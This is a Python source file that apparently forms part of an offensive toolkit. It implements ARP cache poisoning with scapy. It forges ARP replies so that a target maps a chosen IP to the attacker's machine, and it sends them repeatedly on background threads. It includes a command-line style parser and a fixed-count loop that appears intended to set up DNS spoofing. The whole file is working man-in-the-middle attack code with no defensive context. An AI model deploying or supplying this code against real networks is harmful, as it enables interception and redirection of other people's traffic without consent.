import scapy.all as sc
import shlex
import threading
import time

def arp_spoof (target_ip, target_mac, spoofed_ip):
    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    sc.send(packet, verbose=False)

def arp_spoof_loop(ip, mac, iptospoof):
    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, iptospoof))
    while True:
        arp_spoof(ip, mac, iptospoof)
        time.sleep(2)
        print("Spoofing...")

def start_arp_poison(cmd):
    args = shlex.split(cmd)
    ip = mac = iptospoof = None
    for i, arg in enumerate(args):
        if arg == "-tgtip" and i + 1 < len(args):
            ip = args[i + 1]
        elif arg == "-spmac" and i + 1 < len(args):
            mac = args[i + 1]
        elif arg == "-spip" and i + 1 < len(args):
            iptospoof = args[i + 1]
    if not ip or not mac or not iptospoof:
        print("[!] Usage: arp_poison -tgtip <target_ip> -spmac <target_mac> -spip <spoofed_ip>")
        return
    print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, iptospoof))

    arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, mac, iptospoof))
    arp_thread.daemon = True
    arp_thread.start()

def start_arp_thread(target_ip, mac, spoofed_ip, count):
    arp_thread = threading.Thread(target=arp_for_dns_spoof_loop, args=(target_ip, mac, spoofed_ip, count))
    arp_thread.daemon = True
    arp_thread.start()

def arp_for_dns_spoof_loop(ip, mac, spoofed_ip, count):
    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
    i = 0
    while i in range(count):
        arp_spoof(ip, mac, spoofed_ip)
        time.sleep(1)
        i+=1
    print("ARP Poison to %s complete" % ip)


